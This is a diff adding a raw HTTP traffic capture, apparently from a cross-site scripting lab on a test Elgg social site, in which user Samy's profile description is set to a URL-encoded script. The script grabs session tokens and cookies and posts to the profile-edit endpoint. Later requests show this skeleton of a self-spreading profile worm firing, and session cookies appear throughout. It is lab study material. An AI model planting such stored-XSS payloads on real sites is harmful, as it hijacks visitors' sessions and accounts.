@@ -1,0 +1,154 @@
+http://www.xsslabelgg.com/action/profile/edit
+
+POST /action/profile/edit HTTP/1.1
+Host: www.xsslabelgg.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.xsslabelgg.com/profile/samy/edit
+Cookie: Elgg=r1enao9f5cgc0phq490mlm66j0
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1383
+__elgg_token=42b07be63f0e45ac9fcaac597abaf482&__elgg_ts=1510765369&name=Samy&description=%3Cscript%3E%0D%0Avar+worm+%3D+function%28%29%0D%0A%7B%0D%0Avar+content%3D%22%22%3B%0D%0A%7D%0D%0Avar+user+%3D+null%3B%0D%0Auser+%3D+elgg.get_logged_in_user_entity%28%29%3B%0D%0Avar+ts+%3D+elgg.security.token.__elgg_ts%3B%0D%0Avar+token+%3D+elgg.security.token.__elgg_token%3B%0D%0Avar+Ajax%3Dnull%3B%0D%0AAjax%3Dnew+XMLHttpRequest%28%29%3B%0D%0AAjax.open%28%22POST%22%2C%22http%3A%2F%2Fwww.xsslabelgg.com%2Faction%2Fprofile%2Fedit%22%2Ctrue%29%3B%0D%0AAjax.setRequestHeader%28%22Host%22%2C%22www.xsslabelgg.com%22%29%3B%0D%0AAjax.setRequestHeader%28%22Keep-Alive%22%2C%22300%22%29%3B%0D%0AAjax.setRequestHeader%28%22Connection%22%2C%22keep-alive%22%29%3B%0D%0AAjax.setRequestHeader%28%22Cookie%22%2Cdocument.cookie%29%3B%0D%0AAjax.setRequestHeader%28%22Content-Type%22%2C%22application%2Fx-www-form-urlencoded%22%29%3B%0D%0Acontent+%3D+%22%22%2Bworm%3B%0D%0AAjax.send%28content%29%3B%0D%0A%3C%2Fscript%3E&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid=42
+HTTP/1.1 302 Found
+Date: Wed, 15 Nov 2017 17:04:19 GMT
+Server: Apache/2.2.22 (Ubuntu)
+X-Powered-By: PHP/5.3.10-1ubuntu3.14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: http://www.xsslabelgg.com/profile/samy
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+----------------------------------------------------------
+http://www.xsslabelgg.com/profile/samy
+
+GET /profile/samy HTTP/1.1
+Host: www.xsslabelgg.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.xsslabelgg.com/profile/samy/edit
+Cookie: Elgg=r1enao9f5cgc0phq490mlm66j0
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Date: Wed, 15 Nov 2017 17:04:20 GMT
+Server: Apache/2.2.22 (Ubuntu)
+X-Powered-By: PHP/5.3.10-1ubuntu3.14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 3060
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+----------------------------------------------------------
+http://www.xsslabelgg.com/cache/css/default/elgg.1410864370.css
+
+GET /cache/css/default/elgg.1410864370.css HTTP/1.1
+Host: www.xsslabelgg.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.xsslabelgg.com/profile/samy
+Cookie: Elgg=r1enao9f5cgc0phq490mlm66j0
+Connection: keep-alive
+If-None-Match: "1410864370"
+
+HTTP/1.1 304 Not Modified
+Date: Wed, 15 Nov 2017 17:04:20 GMT
+Server: Apache/2.2.22 (Ubuntu)
+Connection: Keep-Alive
+Keep-Alive: timeout=5, max=98
+Vary: Accept-Encoding
+----------------------------------------------------------
+http://www.xsslabelgg.com/cache/js/default/elgg.1410864370.js
+
+GET /cache/js/default/elgg.1410864370.js HTTP/1.1
+Host: www.xsslabelgg.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.xsslabelgg.com/profile/samy
+Cookie: Elgg=r1enao9f5cgc0phq490mlm66j0
+Connection: keep-alive
+If-None-Match: "1410864370"
+
+HTTP/1.1 304 Not Modified
+Date: Wed, 15 Nov 2017 17:04:20 GMT
+Server: Apache/2.2.22 (Ubuntu)
+Connection: Keep-Alive
+Keep-Alive: timeout=5, max=97
+Vary: Accept-Encoding
+----------------------------------------------------------
+http://www.xsslabelgg.com/action/profile/edit
+
+POST /action/profile/edit HTTP/1.1
+Host: www.xsslabelgg.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://www.xsslabelgg.com/profile/samy
+Content-Length: 31
+Cookie: Elgg=r1enao9f5cgc0phq490mlm66j0
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+function ()
+{
+var content="";
+}
+HTTP/1.1 302 Found
+Date: Wed, 15 Nov 2017 17:04:20 GMT
+Server: Apache/2.2.22 (Ubuntu)
+X-Powered-By: PHP/5.3.10-1ubuntu3.14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: http://www.xsslabelgg.com/profile/samy
+Content-Length: 0
+Keep-Alive: timeout=5, max=96
+Connection: Keep-Alive
+Content-Type: text/html
+----------------------------------------------------------
+http://www.xsslabelgg.com/profile/samy
+
+GET /profile/samy HTTP/1.1
+Host: www.xsslabelgg.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.xsslabelgg.com/profile/samy
+Content-Type: application/x-www-form-urlencoded
+Cookie: Elgg=r1enao9f5cgc0phq490mlm66j0
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Date: Wed, 15 Nov 2017 17:04:20 GMT
+Server: Apache/2.2.22 (Ubuntu)
+X-Powered-By: PHP/5.3.10-1ubuntu3.14
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 3066
+Keep-Alive: timeout=5, max=95
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+----------------------------------------------------------
